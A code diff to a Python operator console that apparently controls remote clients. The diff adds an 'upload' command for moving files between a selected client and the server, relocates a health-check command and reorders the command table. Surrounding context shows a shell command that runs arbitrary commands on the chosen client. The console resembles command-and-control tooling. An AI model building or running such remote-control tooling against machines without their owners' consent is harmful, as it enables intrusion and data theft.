@@ -1,11 +1,3 @@
-def cmd_health(server, args, current_client):
-    if not current_client:
-        print("no client selected")
-        return current_client
-    
-    server.send_task(current_client, "health", {})
-    return current_client
-
 def cmd_list(server, args, current_client):
     if not server.clients:
         print("no clients")
@@ -30,8 +22,6 @@ def cmd_use(server, args, current_client):
     print (f"selected {cid}")
     return cid
 
-# def cmd_desuse():
-
 def cmd_shell(server, args, current_client):
     if not current_client:
         print("no client selected")
@@ -45,6 +35,30 @@ def cmd_shell(server, args, current_client):
         "cmd": " ".join(args)
     })
 
+    return current_client
+
+def cmd_upload(server, args, current_client):
+    if not current_client:
+        print("no client selected")
+        return current_client
+    
+    if len(args) < 2:
+        print("usage: upload <client_path> <server_path>")
+        return current_client
+
+    try:
+        server.upload_file(current_client, args[0], args[1])
+    except FileNotFoundError:
+        print(f"file not found: {args[0]}")
+
+    return current_client
+
+def cmd_health(server, args, current_client):
+    if not current_client:
+        print("no client selected")
+        return current_client
+    
+    server.send_task(current_client, "health", {})
     return current_client
 
 def cmd_results(server, args, current_client):
@@ -71,8 +85,9 @@ def cmd_help(server, args, current_client):
 
 COMMANDS = {
     "shell": cmd_shell,
-    "list": cmd_list,
+    "upload": cmd_upload,
     "health": cmd_health,
+    "list": cmd_list,
     "results": cmd_results,
     "use": cmd_use,
     "exit": cmd_exit,
